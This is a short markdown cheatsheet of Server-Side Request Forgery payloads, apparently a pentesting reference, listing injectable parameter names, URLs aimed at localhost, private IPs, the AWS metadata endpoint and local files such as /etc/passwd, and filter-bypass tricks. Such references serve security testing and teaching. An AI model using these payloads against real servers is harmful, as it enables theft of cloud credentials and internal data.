# 🌐 SSRF Cheatsheet

> Practical payloads and techniques for exploiting Server-Side Request Forgery (SSRF)

---

## 🎯 Core Concept

SSRF = Server makes requests on behalf of attacker

👉 "Can I control where the server sends requests?"

---

## 🔍 Where to Look

* `url=`
* `link=`
* `callback=`
* `webhook=`
* `image_url=`

---

## ⚡ Basic Payloads

```plaintext
http://127.0.0.1
http://localhost
http://0.0.0.0
```

---

## 🔐 Internal Network Targets

```plaintext
http://127.0.0.1:80
http://127.0.0.1:8080
http://192.168.0.1
http://10.0.0.1
```

---

## ☁️ Cloud Metadata (CRITICAL)

### AWS

```plaintext
http://169.254.169.254/latest/meta-data/
```

---

## 📂 File Access

```plaintext
file:///etc/passwd
file:///C:/Windows/win.ini
```

---

## 🔁 SSRF Detection

### Use External Interaction

* Burp Collaborator
* Webhook.site

👉 Check if server makes request

---

## 🧠 Bypass Techniques

### URL Encoding

```plaintext
http://127.0.0.1%2F
```

---

### DNS Rebinding

Use attacker-controlled domain

---

### Using @ Trick

```plaintext
http://trusted.com@127.0.0.1
```

---

### Redirect Bypass

Use open redirect:

```plaintext
http://trusted.com/redirect?url=http://127.0.0.1
```

---

## 🔍 Blind SSRF

No response visible:

👉 Use:

* DNS logging
* Collaborator

---

## 📍 High-Value Targets

* Admin panels
* Internal APIs
* Cloud metadata
* Microservices

---

## 🔎 Testing Workflow

1. Identify URL input
2. Send external URL (monitor interaction)
3. Try internal IPs
4. Test cloud metadata
5. Attempt bypass techniques

---

## 🚨 Indicators of SSRF

* Server fetches external content
* Response delay (time-based)
* DNS interaction

---

## 🧠 Pro Tips

* Always test both:

  * Visible SSRF
  * Blind SSRF
* Focus on APIs and integrations

---

## ⚠️ Key Insight

SSRF is powerful because it uses **server trust and network access**
